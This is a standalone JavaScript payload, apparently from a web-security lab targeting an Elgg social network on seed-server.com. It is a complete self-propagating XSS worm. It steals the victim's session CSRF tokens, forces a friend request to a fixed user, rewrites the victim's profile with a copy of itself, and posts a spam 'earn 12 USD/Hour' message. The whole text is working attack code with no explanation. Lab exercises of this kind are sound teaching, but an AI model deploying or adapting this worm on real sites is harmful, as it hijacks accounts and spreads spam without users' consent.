<script id="worm">
    window.onload = function() {
        if (typeof elgg !== 'undefined'){
            if(elgg.security && elgg.security.token && elgg.session && elgg.session.user) {
                var ts = elgg.security.token.__elgg_ts;
                var token = elgg.security.token.__elgg_token;
                var loggedInUserId = elgg.session.user.guid;

                //worm code from script tag
                var wormText = document.getElementById("worm");
                var jsCode = '';
                if (wormText){
                    jsCode = wormText.innerHTML;
                }
                var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
                var tailTag = "</" + "script>";
                var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

                
                // prevent own affects
                var myID = 59;
                if (loggedInUserId !== myID) {
                    // url - friend request
                    var urlAddFriend = "http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=" + ts + "&__elgg_token=" + token;
                    // url - update profile
                    var urlProfile = "http://www.seed-server.com/action/profile/edit";
                    var profileInfo = "description=" + wormCode + "&guid=" + loggedInUserId + "&__elgg_ts=" + ts + "&__elgg_token=" + token;
                    // url - wire post
                    var urlWire = "http://www.seed-server.com/action/thewire/add";
                    var message = "To earn 12 USD/Hour(!), visit now " + "http://www.seed-server.com/profile/" + elgg.session.user.username;
                    var wireInfo = "body=" + encodeURIComponent(message) + "&__elgg_ts=" + ts + "&__elgg_token=" + token;

                    // send request
                    var AjaxFR = new XMLHttpRequest();
                    AjaxFR.open("GET", urlAddFriend, true);
                    AjaxFR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    AjaxFR.send();
                    // Update profile with worm
                    var AjaxPU = new XMLHttpRequest();
                    AjaxPU.open("POST", urlProfile, true);
                    AjaxPU.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    AjaxPU.onreadystatechange = function() {
                    if (AjaxPU.readyState === XMLHttpRequest.DONE && AjaxPU.status === 200) {
                        // Post on The Wire
                        var AjaxWP = new XMLHttpRequest();
                        AjaxWP.open("POST", urlWire, true);
                        AjaxWP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        AjaxWP.send(wireInfo);
                    }
                    };
                    AjaxPU.send(profileInfo);
                }
            }
        }
    }
</script>
